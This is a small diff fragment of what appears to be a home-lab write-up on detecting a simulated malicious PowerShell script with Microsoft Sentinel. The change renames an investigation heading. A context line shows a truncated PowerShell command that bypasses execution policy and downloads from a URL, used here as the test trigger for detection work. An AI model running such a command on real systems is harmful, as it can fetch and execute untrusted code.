@@ -83,7 +83,7 @@ powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://r
 ```
 ---
 
-### 🕵️ Investigate the Incident
+### 🕵️ Rule Triggered - Triage the Incident
 
 The simulated malicious PS script successfully triggered the Sentinel Analytics rule, the alert appears in Microsoft Sentinel under **Incidents**. I began the investigation:
 
